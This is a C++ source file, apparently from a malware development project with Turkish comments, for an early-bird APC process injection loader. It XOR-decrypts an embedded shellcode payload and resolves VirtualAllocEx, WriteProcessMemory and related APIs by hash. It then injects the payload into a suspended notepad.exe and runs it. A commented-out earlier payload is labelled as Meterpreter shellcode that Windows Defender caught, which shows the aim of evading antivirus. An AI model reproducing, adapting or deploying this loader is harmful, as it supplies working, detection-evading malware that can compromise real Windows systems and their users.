#include "../include/injection.h"
#include "../include/api_hashing.h"
#include <vector>
#include <iostream>
#include <cstdio>

typedef LPVOID (WINAPI * P_VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI * P_WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef BOOL (WINAPI * P_VirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
typedef DWORD (WINAPI * P_QueueUserAPC)(PAPCFUNC, HANDLE, ULONG_PTR);
typedef DWORD (WINAPI * P_ResumeThread)(HANDLE);

#define HASH_VIRTUALALLOCEX     0xf36e5ab4
#define HASH_WRITEPROCESSMEMORY 0x6f22e8c8
#define HASH_VIRTUALPROTECTEX   0xd812922a
#define HASH_QUEUEUSERAPC       0x76c0c4bd
#define HASH_RESUMETHREAD       0x74162a6e

// payload
unsigned char encrypted_data[] = {0x11,0x64,0x9a,0x34,0x09,0xc6,0x12,0x55,0x05,0xb3,0x33,0x59,0x1e,0xbf,0x3f,0x68,0x15,0xde,0x46,0x1c,0xca,0x44,0x1d,0xbe,0x04,0x18,0xa8,0x22,0x17,0xbf,0x00,0x74,0x14,0x64,0xb7,0x10,0xf6,0xc5,0x1d,0x34,0x82,0x71,0x42,0x8e,0x13,0xbf,0x76,0x05,0x58,0x9a,0x09,0xda,0x0e,0x55,0x15,0xbe,0x3a,0x18,0x0e,0x40,0x98,0xd7,0x76,0xb7,0x90,0x1d,0x79,0xa7,0x00,0xc6,0x64,0xbb,0x01,0x39,0x8d,0x09,0x67,0xf4,0x01,0x79,0x8b,0xa9,0xe4,0xd5,0x81,0x39,0x57,0xf4,0x87,0x35,0x42,0x83,0xbd,0xc0,0x0d,0x71,0x9b,0x20,0x92,0x14,0xca,0x1a,0x74,0x78,0x4c,0xf2,0x02,0x4e,0xe1,0x38,0x03,0x0d,0xd2,0x0a,0x54,0x1c,0x40,0x86,0x11,0xbe,0x49,0xb3,0x0f,0x40,0x9e,0xf7,0x8a,0x09,0xe1,0xcd,0xb6,0xdb,0x4f,0xa5,0xc2,0xca,0xb2,0xc7,0x0b,0x70,0x9f,0x65,0x01,0xf1,0x3a,0x34,0x24,0x32,0x6f,0x28,0x28,0x50,0x1c,0x70,0xce,0x4d,0x72,0x7c,0x78,0x9a,0x11,0xaa,0x8a,0x19,0xc2,0xa1,0x78,0xca,0x9d};
unsigned int data_len = sizeof(encrypted_data);
char key[] = "YUHQAMP5M8CAV4IH";

// old shellcode. (meterpreter) this one detected by windows defender.
//unsigned char encrypted_data[] = {0xac,0x19,0xce,0xd5,0xc8,0xbf,0x81,0x53,0x41,0x57,0x02,0x0b,0x04,0x16,0x05,0x03,0x06,0x19,0x7c,0xe3,0x5d,0x1f,0xca,0x01,0x21,0x1f,0xc8,0x08,0x5d,0x0e,0xdc,0x00,0x70,0x19,0xc6,0x43,0x68,0x1f,0x4e,0xe4,0x0b,0x1d,0x0e,0x6b,0x8c,0x0e,0x66,0x92,0xfc,0x6d,0x2c,0x4d,0x3a,0x7b,0x61,0x12,0x80,0x9e,0x4e,0x1b,0x44,0x87,0xb5,0xbf,0x02,0x10,0x1c,0x79,0xb3,0x05,0x61,0xd8,0x03,0x6b,0x0b,0x5b,0x95,0xcd,0xd7,0xda,0x50,0x51,0x4d,0x79,0xbd,0x97,0x35,0x34,0x09,0x56,0x93,0x0a,0xce,0x0e,0x4f,0x16,0xdb,0x11,0x6d,0x78,0x39,0x87,0xa2,0x05,0x09,0xa8,0x8a,0x1b,0xce,0x72,0xdf,0x1a,0x51,0x87,0x00,0x00,0xf1,0x1f,0x70,0x93,0xed,0x16,0x82,0x93,0x48,0x07,0x56,0x93,0x68,0xb1,0x38,0xc0,0x74,0x54,0x0d,0x77,0x49,0x12,0x7a,0x8b,0x30,0x9e,0x0f,0x16,0xdb,0x11,0x69,0x78,0x39,0x87,0x27,0x12,0xca,0x5b,0x0b,0x1e,0xce,0x06,0x4b,0x1b,0x51,0x81,0x0c,0xba,0x3c,0xdf,0x09,0x52,0x91,0x16,0x1b,0x1b,0x1d,0x18,0x0e,0x08,0x11,0x09,0x0c,0x68,0x79,0x0d,0x09,0xd0,0xad,0x77,0x02,0x08,0xba,0xa6,0x0f,0x13,0x09,0x0b,0x05,0xba,0x2a,0xbe,0x16,0xac,0xbe,0xa8,0x1e,0x12,0xff,0x47,0x57,0x52,0x50,0x51,0x4d,0x31,0x38,0x1f,0xcc,0xde,0x40,0x56,0x43,0x5a,0x04,0xfc,0x66,0xd9,0x3f,0xd6,0xb2,0xe4,0x83,0xa7,0xf4,0xf1,0x17,0x16,0xf9,0xfc,0xd0,0xfb,0xca,0xad,0x85,0x19,0xce,0xf5,0x10,0x6b,0x47,0x2f,0x4b,0xd7,0xb8,0xba,0x30,0x43,0xec,0x15,0x43,0x23,0x22,0x5b,0x38,0x0e,0x00,0xda,0x9b,0xa8,0x96,0x39,0x24,0x2a,0x34,0x7c,0x35,0x29,0x28,0x31};
//unsigned int data_len = sizeof(encrypted_data);
//char key[] = "PQM18WASAWCZEFWR";


void Decrypt(unsigned char* data, size_t data_len, char* key, size_t key_len) {
    for (size_t i = 0; i < data_len; i++) {
        data[i] = data[i] ^ key[i % key_len];
    }
}

// maldev academy'den yoinkledim. hafif değiştirdim. 
BOOL CreateTargetProcess(LPCSTR lpProcessName, PROCESS_INFORMATION* pi) {
    CHAR lpPath[MAX_PATH * 2];
    CHAR WnDr[MAX_PATH];
    STARTUPINFOA si = { 0 }; 

    RtlSecureZeroMemory(&si, sizeof(STARTUPINFOA));
    RtlSecureZeroMemory(pi, sizeof(PROCESS_INFORMATION));
    si.cb = sizeof(STARTUPINFOA);

    if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
        printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    snprintf(lpPath, sizeof(lpPath), "%s\\System32\\%s", WnDr, lpProcessName);

    if (!CreateProcessA(
        NULL,
        lpPath,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        pi)) {
        printf("[!] CreateProcessA Failed with Error : %d \n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

// bunu da maldev academyden aldım. yine değiştirdim bikaç bişiyi
bool RunAPC() {
    PROCESS_INFORMATION pi = { 0 };
    
    // target process
    if (!CreateTargetProcess("notepad.exe", &pi)) {
        return false;
    }

    size_t payload_len = sizeof(encrypted_data);
    // xor
    Decrypt(encrypted_data, payload_len, key, sizeof(key) - 1);

    P_VirtualAllocEx pVirtualAllocEx = (P_VirtualAllocEx)GetProcAddressByHash(HASH_VIRTUALALLOCEX);
    if (pVirtualAllocEx == NULL) {
        printf("[!] VirtualAllocEx Failed With Error..\n");
        return false;
    }

    // önce write veriyorum
    LPVOID pRemoteCode = pVirtualAllocEx(pi.hProcess, NULL, payload_len, 
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!pRemoteCode) {
        printf("[!] VirtualAllocEx Failed With Error : %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    P_WriteProcessMemory pWriteProcessMemory = (P_WriteProcessMemory)GetProcAddressByHash(HASH_WRITEPROCESSMEMORY);

    if (!pWriteProcessMemory(pi.hProcess, pRemoteCode, encrypted_data, payload_len, NULL)) {
        printf("[!] WriteProcessMemory Failed With Error : %d\n", GetLastError());
        VirtualFreeEx(pi.hProcess, pRemoteCode, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    // şimdi exe yetkisi veriyom
    P_VirtualProtectEx pVirtualProtectEx = (P_VirtualProtectEx)GetProcAddressByHash(HASH_VIRTUALPROTECTEX);
    DWORD oldProtect = 0;
    if (!pVirtualProtectEx(pi.hProcess, pRemoteCode, payload_len, PAGE_EXECUTE_READ, &oldProtect)) {
        printf("[!] VirtualProtectEx Failed With Error : %d\n", GetLastError());
        VirtualFreeEx(pi.hProcess, pRemoteCode, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    // 6. APC
    P_QueueUserAPC pQueueUserAPC = (P_QueueUserAPC)GetProcAddressByHash(HASH_QUEUEUSERAPC);
    if (!pQueueUserAPC((PAPCFUNC)pRemoteCode, pi.hThread, NULL)) {
        printf("[!] QueueUserAPC Failed With Error : %d\n", GetLastError());
        VirtualFreeEx(pi.hProcess, pRemoteCode, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    printf("\n\t[+] Resuming Thread ...\n");
    P_ResumeThread pResumeThread = (P_ResumeThread)GetProcAddressByHash(HASH_RESUMETHREAD);
    pResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return true;
}


